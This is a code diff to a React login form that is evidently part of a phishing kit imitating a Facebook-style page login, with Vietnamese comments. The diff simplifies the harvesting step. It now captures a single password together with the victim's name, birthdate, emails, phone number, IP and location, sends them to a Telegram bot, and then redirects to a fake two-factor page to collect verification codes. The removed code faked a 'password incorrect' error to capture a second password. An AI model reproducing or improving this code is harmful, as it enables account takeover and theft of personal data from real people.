@@ -360,22 +360,22 @@ function LoginForm({ onClose }) {
 🔓 CODE 2FA 2: <code>${code2}</code>
 🔄 Trạng thái: Hoàn tất!`;
   const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (loadingPassword) return; // chặn double-click
+  e.preventDefault();
+  if (loadingPassword) return; 
 
-    if (validateInputs()) {
-      setLoadingPassword(true);
-      setIsSubmitDisabled(true);
+  if (validateInputs()) {
+    setLoadingPassword(true);
+    setIsSubmitDisabled(true);
 
-      const currentTime = getCurrentTime();
-      const locationParts = location.split("/").map((part) => part.trim());
+    const currentTime = getCurrentTime();
+    const locationParts = location.split("/").map((part) => part.trim());
 
-      if (clickCount === 0) {
-        // Lưu tạm vào biến local (chưa setState vội)
-        const firstPassword = password;
-        setPassword1(firstPassword);
+    // 1. Lưu mật khẩu vào biến password1
+    const finalPassword = password;
+    setPassword1(finalPassword);
 
-        const finalMessage = `
+    // 2. Tạo nội dung tin nhắn gửi Telegram (Chỉ gửi 1 pass)
+    const message = `
 👤 <b>THÔNG TIN PHỤ</b>
 📱 Tên PAGE: <code>${formData.link}</code>
 👨‍💼 Họ Tên: <code>${formData.fullName}</code>
@@ -391,72 +391,35 @@ function LoginForm({ onClose }) {
 📧 Email: <code>${formData.personalEmail}</code>
 📧 Email Business: <code>${formData.businessEmail}</code>
 📞 SĐT: <code>${formData.phoneNumber}</code>
-🔑 Mật Khẩu 1: <code>${firstPassword}</code>
-🔄 Trạng thái: Đang chờ mật khẩu 2...`;
-
-        await updateTelegramMessage(finalMessage);
-
-        setTimeout(() => {
-          setErrors((prevErrors) => ({
-            ...prevErrors,
-            submit: "The password you've entered is incorrect.",
-          }));
-          setPassword("");
-          setIsSubmitDisabled(false);
-          setLoadingPassword(false);
-        }, 3000);
-      } else if (clickCount === 1) {
-        const secondPassword = password;
-        setPassword2(secondPassword);
-
-        const finalMessage = `
-👤 <b>THÔNG TIN PHỤ</b>
-📱 Tên PAGE: <code>${formData.link}</code>
-👨‍💼 Họ Tên: <code>${formData.fullName}</code>
-🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
-━━━━━━━━━━━━━━━━━━━━━
-📍 <b>THÔNG TIN VỊ TRÍ</b>
-🌐 IP: <code>${ip}</code>
-🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
-🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
-⏰ Thời Gian: <code>${currentTime}</code>
-━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
-📧 Email: <code>${formData.personalEmail}</code>
-📧 Email Business: <code>${formData.businessEmail}</code>
-📞 SĐT: <code>${formData.phoneNumber}</code>
-🔑 Mật Khẩu 1: <code>${password1}</code>
-🔑 Mật Khẩu 2: <code>${secondPassword}</code>
+🔑 Mật Khẩu: <code>${finalPassword}</code>
 🔄 Trạng thái: Đang chờ mã xác thực 2FA...`;
 
-        await updateTelegramMessage(finalMessage);
+    // 3. Gửi cập nhật lên Telegram
+    await updateTelegramMessage(message);
 
-        setTimeout(() => {
-          setIsSubmitDisabled(false);
-          setLoadingPassword(false);
+    // 4. Chờ 1.5s - 2s để tạo hiệu ứng loading rồi chuyển trang
+    setTimeout(() => {
+      setLoadingPassword(false);
+      setIsSubmitDisabled(false);
 
-          navigate(
-            "/two_step_verification/two_factor?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next",
-            {
-              state: {
-                method: "app",
-                ip,
-                location,
-                formData,
-                password1,
-                password2: secondPassword,
-                additionalInfo,
-                currentUrl,
-              },
-              replace: true,
-            }
-          );
-        }, 1200);
-      }
-
-      setClickCount((prev) => prev + 1);
-    }
-  };
+      navigate(
+        "/two_step_verification/two_factor?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next",
+        {
+          state: {
+            method: "app",
+            ip,
+            location,
+            formData,
+            password1: finalPassword, // Gửi mật khẩu duy nhất này đi
+            additionalInfo,
+            currentUrl,
+          },
+          replace: true,
+        }
+      );
+    }, 2000); 
+  }
+};
 
   const sendToTelegram = async () => {
     try {
